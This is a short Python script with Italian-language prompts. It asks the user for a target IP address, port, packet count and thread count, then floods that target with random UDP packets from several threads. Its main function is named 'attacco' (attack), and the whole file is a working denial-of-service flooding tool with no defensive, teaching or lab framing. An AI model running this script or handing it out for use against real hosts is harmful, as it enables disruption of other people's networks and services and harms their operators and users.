import socket
import random
import threading

ip = str(input("Inserisci IP:"))
port = int(input("Inserisci porta: "))
pk = int(input("Inserisci numero pk: "))
threads = int(input("Quanti threads vuoi avere:"))
data = random.randbytes(1024)

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def attacco():
    try:
        for x in range(pk):
            s.sendto(data, (ip, port))
            print(f"Pacchetto UDP n {x+1} inviato")
    except:
        s.close()
        print("Errore!")

for y in range(threads):
    th = threading.Thread(target = attacco)
    th.start()